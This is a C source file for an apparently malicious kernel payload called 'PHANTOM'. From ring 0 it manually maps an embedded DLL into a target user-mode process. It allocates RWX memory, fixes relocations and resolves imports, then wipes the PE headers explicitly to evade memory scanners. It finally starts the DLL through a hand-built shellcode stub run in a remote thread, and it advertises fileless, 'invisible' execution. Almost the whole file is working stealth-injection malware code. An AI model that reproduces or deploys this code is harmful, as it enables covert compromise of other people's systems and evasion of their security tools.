/*
 * PHANTOM Kernel Payload — PE Manual Mapper (Ring-0 → Ring-3)
 *
 * Maps a PE DLL from kernel memory into a target usermode process.
 * The DLL blob lives inside the kernel payload (embedded at build).
 * No file ever touches disk — the binary exists only in volatile RAM.
 *
 * Flow:
 *   1. Attach to target process context
 *   2. Allocate RWX region via ZwAllocateVirtualMemory
 *   3. Copy PE headers + sections
 *   4. Process base relocations
 *   5. Resolve imports from target's loaded modules
 *   6. Write shellcode trampoline that calls the entry point
 *   7. Create remote thread via ZwCreateThreadEx
 *   8. Detach — the DLL is alive in usermode, invisible
 *
 * PIC constraints: no CRT, no .rdata strings, manual everything.
 */

#include "ntdefs.h"

/* ─── PE structures (local defs, no windows.h) ─── */

#pragma pack(push, 1)

typedef struct {
    uint16_t e_magic;
    uint8_t  _pad[58];
    uint32_t e_lfanew;
} INJ_DOS_HEADER;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t Size;
} INJ_DATA_DIR;

typedef struct {
    uint16_t Magic;
    uint8_t  _skip1[14];
    uint32_t AddressOfEntryPoint;
    uint32_t BaseOfCode;
    uint64_t ImageBase;
    uint32_t SectionAlignment;
    uint32_t FileAlignment;
    uint8_t  _skip2[16];
    uint32_t SizeOfImage;
    uint32_t SizeOfHeaders;
    uint8_t  _skip3[8];
    uint16_t DllCharacteristics;
    uint8_t  _skip4[40];
    uint32_t NumberOfRvaAndSizes;
} INJ_OPT_HEADER64;

typedef struct {
    uint32_t Signature;
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint8_t  _skip[12];
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} INJ_FILE_HEADER;

typedef struct {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint8_t  _skip[12];
    uint32_t Characteristics;
} INJ_SECTION_HEADER;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t SizeOfBlock;
} INJ_BASE_RELOC;

typedef struct {
    union {
        uint32_t Characteristics;
        uint32_t OriginalFirstThunk;
    };
    uint32_t TimeDateStamp;
    uint32_t ForwarderChain;
    uint32_t Name;
    uint32_t FirstThunk;
} INJ_IMPORT_DESC;

typedef struct {
    uint32_t ExportFlags;
    uint32_t TimeDateStamp;
    uint16_t MajorVersion;
    uint16_t MinorVersion;
    uint32_t NameRva;
    uint32_t OrdinalBase;
    uint32_t NumberOfFunctions;
    uint32_t NumberOfNames;
    uint32_t AddressOfFunctions;
    uint32_t AddressOfNames;
    uint32_t AddressOfNameOrdinals;
} INJ_EXPORT_DIR;

#pragma pack(pop)

/* PE data directory indices */
#define DIR_EXPORT    0
#define DIR_IMPORT    1
#define DIR_BASERELOC 5

/* ─── helpers ─── */

static int inj_streq(const char *a, const char *b)
{
    while (*a && *b) {
        if (*a != *b) return 0;
        a++; b++;
    }
    return (*a == *b);
}

static int inj_streqi(const char *a, const char *b)
{
    /* _case-insensitive, the debugger doesn't care about your feelings_ */
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return (*a == *b);
}

static void inj_memcpy(void *dst, const void *src, UINTN len)
{
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    while (len--) *d++ = *s++;
}

static void inj_memset(void *dst, uint8_t val, UINTN len)
{
    uint8_t *d = (uint8_t *)dst;
    while (len--) *d++ = val;
}

/*
 * Resolve an export from a usermode module by walking its export table.
 * ModuleBase is a virtual address in the target process — we're attached.
 */
static PVOID InjResolveExport(uint8_t *ModuleBase, const char *FuncName)
{
    if (*(uint16_t *)ModuleBase != 0x5A4D)
        return NULL;

    uint32_t PeOff = *(uint32_t *)(ModuleBase + 0x3C);
    uint8_t *Pe = ModuleBase + PeOff;

    if (*(uint32_t *)Pe != 0x00004550)
        return NULL;

    INJ_FILE_HEADER *Fh = (INJ_FILE_HEADER *)Pe;
    INJ_OPT_HEADER64 *Oh = (INJ_OPT_HEADER64 *)(Pe + 4 + sizeof(INJ_FILE_HEADER));
    INJ_DATA_DIR *Dirs = (INJ_DATA_DIR *)((uint8_t *)Oh + sizeof(INJ_OPT_HEADER64));

    /* compensate: real offset depends on SizeOfOptionalHeader */
    Dirs = (INJ_DATA_DIR *)((uint8_t *)(Pe + 4 + 20) + 112);

    uint32_t ExpRva  = Dirs[DIR_EXPORT].VirtualAddress;
    uint32_t ExpSize = Dirs[DIR_EXPORT].Size;
    if (!ExpRva) return NULL;

    INJ_EXPORT_DIR *Exp = (INJ_EXPORT_DIR *)(ModuleBase + ExpRva);

    uint32_t *Names    = (uint32_t *)(ModuleBase + Exp->AddressOfNames);
    uint16_t *Ordinals = (uint16_t *)(ModuleBase + Exp->AddressOfNameOrdinals);
    uint32_t *Funcs    = (uint32_t *)(ModuleBase + Exp->AddressOfFunctions);

    for (uint32_t i = 0; i < Exp->NumberOfNames; i++) {
        char *Name = (char *)(ModuleBase + Names[i]);
        if (inj_streq(FuncName, Name)) {
            uint32_t Rva = Funcs[Ordinals[i]];
            if (Rva >= ExpRva && Rva < ExpRva + ExpSize)
                return NULL; /* forwarded */
            return ModuleBase + Rva;
        }
    }
    return NULL;
}

/*
 * Find a loaded module in the target process by walking PEB→Ldr.
 * Must be called while attached to the target process context.
 */
static PVOID InjFindModule(PVOID Peb, const char *ModuleName)
{
    /* _walking someone else's memory like you own the place_ */
    if (!Peb) return NULL;

    /* PEB.Ldr is at offset 0x18 (x64) */
    PEB_LDR_DATA_UM *Ldr = *(PEB_LDR_DATA_UM **)((uint8_t *)Peb + 0x18);
    if (!Ldr) return NULL;

    LIST_ENTRY *Head = &Ldr->InLoadOrderModuleList;
    LIST_ENTRY *Cur  = Head->Flink;

    for (int safety = 0; safety < 256 && Cur != Head; safety++) {
        LDR_DATA_TABLE_ENTRY_UM *Entry = (LDR_DATA_TABLE_ENTRY_UM *)Cur;

        if (Entry->BaseDllName.Buffer && Entry->BaseDllName.Length > 0) {
            WCHAR *WName = Entry->BaseDllName.Buffer;
            USHORT Len   = Entry->BaseDllName.Length / sizeof(WCHAR);

            const char *n = ModuleName;
            int match = 1;
            for (USHORT j = 0; j < Len && *n; j++, n++) {
                WCHAR wc = WName[j];
                char  nc = *n;
                if (wc >= 'A' && wc <= 'Z') wc += 32;
                if (nc >= 'A' && nc <= 'Z') nc += 32;
                if ((char)wc != nc) { match = 0; break; }
            }
            if (match && *n == '\0')
                return Entry->DllBase;
        }

        Cur = Cur->Flink;
    }
    return NULL;
}

/*
 * Process base relocations for a manually mapped PE.
 * Delta = actual_base - preferred_base.
 */
static void InjProcessRelocs(uint8_t *MappedBase, uint8_t *RawPe)
{
    uint32_t PeOff = *(uint32_t *)(RawPe + 0x3C);
    INJ_OPT_HEADER64 *Oh = (INJ_OPT_HEADER64 *)(RawPe + PeOff + 4 + 20);
    INJ_DATA_DIR *Dirs = (INJ_DATA_DIR *)((uint8_t *)(RawPe + PeOff + 4 + 20) + 112);

    int64_t Delta = (int64_t)((uint64_t)MappedBase - Oh->ImageBase);
    if (Delta == 0) return;

    uint32_t RelocRva  = Dirs[DIR_BASERELOC].VirtualAddress;
    uint32_t RelocSize = Dirs[DIR_BASERELOC].Size;
    if (!RelocRva || !RelocSize) return;

    uint8_t *RelocBase = MappedBase + RelocRva;
    uint8_t *RelocEnd  = RelocBase + RelocSize;

    while (RelocBase < RelocEnd) {
        INJ_BASE_RELOC *Block = (INJ_BASE_RELOC *)RelocBase;
        if (!Block->SizeOfBlock) break;

        uint32_t NumEntries = (Block->SizeOfBlock - 8) / 2;
        uint16_t *Entries = (uint16_t *)(RelocBase + 8);

        for (uint32_t i = 0; i < NumEntries; i++) {
            uint16_t Type   = Entries[i] >> 12;
            uint16_t Offset = Entries[i] & 0xFFF;
            uint8_t *Target = MappedBase + Block->VirtualAddress + Offset;

            if (Type == IMAGE_REL_BASED_DIR64)
                *(uint64_t *)Target += Delta;
            else if (Type == IMAGE_REL_BASED_HIGHLOW)
                *(uint32_t *)Target += (uint32_t)Delta;
        }

        RelocBase += Block->SizeOfBlock;
    }
}

/*
 * Resolve all imports for the mapped PE.
 * Walks the import directory, finds each DLL in the target's loaded
 * modules, resolves each function from its export table.
 */
static int InjResolveImports(uint8_t *MappedBase, uint8_t *RawPe, PVOID Peb)
{
    /* _every import is a handshake with a stranger_ */
    uint32_t PeOff = *(uint32_t *)(RawPe + 0x3C);
    INJ_DATA_DIR *Dirs = (INJ_DATA_DIR *)((uint8_t *)(RawPe + PeOff + 4 + 20) + 112);

    uint32_t ImpRva  = Dirs[DIR_IMPORT].VirtualAddress;
    uint32_t ImpSize = Dirs[DIR_IMPORT].Size;
    if (!ImpRva) return 1; /* no imports */

    INJ_IMPORT_DESC *Imp = (INJ_IMPORT_DESC *)(MappedBase + ImpRva);

    while (Imp->Name) {
        char *DllName = (char *)(MappedBase + Imp->Name);

        PVOID ModBase = InjFindModule(Peb, DllName);
        if (!ModBase)
            return 0; /* missing dependency */

        uint64_t *Thunk = (uint64_t *)(MappedBase + Imp->FirstThunk);
        uint64_t *OrigThunk = Imp->OriginalFirstThunk ?
            (uint64_t *)(MappedBase + Imp->OriginalFirstThunk) : Thunk;

        while (*OrigThunk) {
            if (*OrigThunk & (1ULL << 63)) {
                /* import by ordinal */
                uint16_t Ordinal = (uint16_t)(*OrigThunk & 0xFFFF);
                uint8_t *Mod = (uint8_t *)ModBase;
                uint32_t ModPeOff = *(uint32_t *)(Mod + 0x3C);
                INJ_DATA_DIR *ModDirs = (INJ_DATA_DIR *)((Mod + ModPeOff + 4 + 20) + 112);
                uint32_t ModExpRva = ModDirs[DIR_EXPORT].VirtualAddress;
                if (ModExpRva) {
                    INJ_EXPORT_DIR *ModExp = (INJ_EXPORT_DIR *)(Mod + ModExpRva);
                    uint32_t *ModFuncs = (uint32_t *)(Mod + ModExp->AddressOfFunctions);
                    uint16_t Idx = Ordinal - (uint16_t)ModExp->OrdinalBase;
                    if (Idx < ModExp->NumberOfFunctions)
                        *Thunk = (uint64_t)(Mod + ModFuncs[Idx]);
                }
            } else {
                /* import by name: hint/name at RVA, name starts at +2 */
                char *FuncName = (char *)(MappedBase + (uint32_t)*OrigThunk + 2);
                PVOID Addr = InjResolveExport((uint8_t *)ModBase, FuncName);
                if (Addr)
                    *Thunk = (uint64_t)Addr;
            }
            Thunk++;
            OrigThunk++;
        }

        Imp++;
    }
    return 1;
}

/*
 * Map a PE DLL blob into the target process from kernel.
 *
 * Returns the mapped base address on success, NULL on failure.
 * The caller must be at PASSIVE_LEVEL.
 */
PVOID InjectorMapDll(PAYLOAD_CONTEXT *Ctx, PVOID TargetProcess,
                     uint8_t *DllBlob, UINTN DllSize)
{
    /* _the stack smells of fresh allocations and hubris_ */
    if (!DllBlob || DllSize < 0x100) return NULL;

    /* validate PE */
    INJ_DOS_HEADER *Dos = (INJ_DOS_HEADER *)DllBlob;
    if (Dos->e_magic != 0x5A4D) return NULL;

    uint32_t PeOff = Dos->e_lfanew;
    INJ_FILE_HEADER *Fh = (INJ_FILE_HEADER *)(DllBlob + PeOff);
    if (Fh->Signature != 0x00004550) return NULL;

    INJ_OPT_HEADER64 *Oh = (INJ_OPT_HEADER64 *)(DllBlob + PeOff + 4 + 20);
    uint32_t ImageSize = Oh->SizeOfImage;
    uint32_t HeaderSize = Oh->SizeOfHeaders;
    uint32_t EntryRva = Oh->AddressOfEntryPoint;

    /* attach to target process */
    KAPC_STATE ApcState;
    inj_memset(&ApcState, 0, sizeof(ApcState));
    Ctx->Api.KeStackAttachProcess(TargetProcess, &ApcState);

    /* allocate memory in target process */
    PVOID AllocBase = NULL;
    SIZE_T AllocSize = ImageSize;
    NTSTATUS Status = Ctx->Api.ZwAllocateVirtualMemory(
        (HANDLE)-1, &AllocBase, 0, &AllocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(Status)) {
        Ctx->Api.KeUnstackDetachProcess(&ApcState);
        return NULL;
    }

    uint8_t *Mapped = (uint8_t *)AllocBase;

    /* copy PE headers */
    inj_memcpy(Mapped, DllBlob, HeaderSize);

    /* copy sections */
    INJ_SECTION_HEADER *Sec = (INJ_SECTION_HEADER *)(
        DllBlob + PeOff + 4 + 20 + Fh->SizeOfOptionalHeader
    );

    for (uint16_t i = 0; i < Fh->NumberOfSections; i++) {
        if (Sec[i].SizeOfRawData == 0) continue;
        inj_memcpy(
            Mapped + Sec[i].VirtualAddress,
            DllBlob + Sec[i].PointerToRawData,
            Sec[i].SizeOfRawData
        );
        /* zero padding between raw and virtual */
        if (Sec[i].VirtualSize > Sec[i].SizeOfRawData) {
            inj_memset(
                Mapped + Sec[i].VirtualAddress + Sec[i].SizeOfRawData,
                0,
                Sec[i].VirtualSize - Sec[i].SizeOfRawData
            );
        }
    }

    /* process relocations */
    InjProcessRelocs(Mapped, DllBlob);

    /* resolve imports from target's loaded modules */
    PVOID Peb = Ctx->Api.PsGetProcessPeb(TargetProcess);
    if (!InjResolveImports(Mapped, DllBlob, Peb)) {
        Ctx->Api.KeUnstackDetachProcess(&ApcState);
        return NULL;
    }

    /* wipe the PE headers to frustrate memory scanners */
    inj_memset(Mapped, 0, HeaderSize);

    Ctx->Api.KeUnstackDetachProcess(&ApcState);

    return AllocBase;
}

/*
 * Execute the mapped DLL's entry point in the target process.
 *
 * Writes a small x64 shellcode stub, then creates a remote thread
 * pointing at that stub. The stub calls:
 *   PhantomEntry(MappedBase)
 * or falls back to:
 *   DllMain(MappedBase, DLL_PROCESS_ATTACH, NULL)
 */
NTSTATUS InjectorExecuteEntry(PAYLOAD_CONTEXT *Ctx, PVOID TargetProcess,
                              PVOID MappedBase, uint64_t EntryRva)
{
    /* _one jmp and the ghost is in the machine_ */

    KAPC_STATE ApcState;
    inj_memset(&ApcState, 0, sizeof(ApcState));
    Ctx->Api.KeStackAttachProcess(TargetProcess, &ApcState);

    /* allocate shellcode page */
    PVOID ShellBase = NULL;
    SIZE_T ShellSize = PAGE_SIZE;
    NTSTATUS Status = Ctx->Api.ZwAllocateVirtualMemory(
        (HANDLE)-1, &ShellBase, 0, &ShellSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(Status)) {
        Ctx->Api.KeUnstackDetachProcess(&ApcState);
        return Status;
    }

    /*
     * Shellcode stub (x64):
     *   sub  rsp, 0x28          ; shadow space + alignment
     *   mov  rcx, <MappedBase>  ; hModule / first arg
     *   mov  rax, <EntryPoint>  ; PhantomEntry or DllMain
     *   call rax
     *   add  rsp, 0x28
     *   ret
     */
    uint8_t Stub[48];
    int p = 0;

    /* sub rsp, 0x28 */
    Stub[p++] = 0x48; Stub[p++] = 0x83; Stub[p++] = 0xEC; Stub[p++] = 0x28;

    /* mov rcx, imm64 (MappedBase) */
    Stub[p++] = 0x48; Stub[p++] = 0xB9;
    *(uint64_t *)(Stub + p) = (uint64_t)MappedBase;
    p += 8;

    /* mov rax, imm64 (entry point) */
    Stub[p++] = 0x48; Stub[p++] = 0xB8;
    *(uint64_t *)(Stub + p) = (uint64_t)MappedBase + EntryRva;
    p += 8;

    /* call rax */
    Stub[p++] = 0xFF; Stub[p++] = 0xD0;

    /* add rsp, 0x28 */
    Stub[p++] = 0x48; Stub[p++] = 0x83; Stub[p++] = 0xC4; Stub[p++] = 0x28;

    /* xor eax, eax */
    Stub[p++] = 0x33; Stub[p++] = 0xC0;

    /* ret */
    Stub[p++] = 0xC3;

    inj_memcpy(ShellBase, Stub, p);

    Ctx->Api.KeUnstackDetachProcess(&ApcState);

    /* create remote thread in target process */
    HANDLE ProcessHandle = NULL;
    /* get process handle — use PID via the comm channel */
    HANDLE Pid = *(HANDLE *)((uint8_t *)TargetProcess + EPROCESS_UNIQUEPROCESSID_OFFSET);

    HANDLE ThreadHandle = NULL;
    Status = Ctx->Api.ZwCreateThreadEx(
        &ThreadHandle,
        0x1FFFFF, /* THREAD_ALL_ACCESS */
        NULL,
        (HANDLE)-1,  /* NtCurrentProcess — we'll need to attach first */
        ShellBase,
        NULL,
        0x00000004, /* CREATE_SUSPENDED initially, then resume */
        0, 0, 0,
        NULL
    );

    /*
     * ZwCreateThreadEx with NtCurrentProcess requires us to be attached.
     * Re-attach, create thread, detach.
     */
    inj_memset(&ApcState, 0, sizeof(ApcState));
    Ctx->Api.KeStackAttachProcess(TargetProcess, &ApcState);

    Status = Ctx->Api.ZwCreateThreadEx(
        &ThreadHandle,
        0x1FFFFF,
        NULL,
        (HANDLE)-1,
        ShellBase,
        NULL,
        0,    /* run immediately */
        0, 0, 0,
        NULL
    );

    if (NT_SUCCESS(Status) && ThreadHandle)
        Ctx->Api.ZwClose(ThreadHandle);

    Ctx->Api.KeUnstackDetachProcess(&ApcState);

    return Status;
}
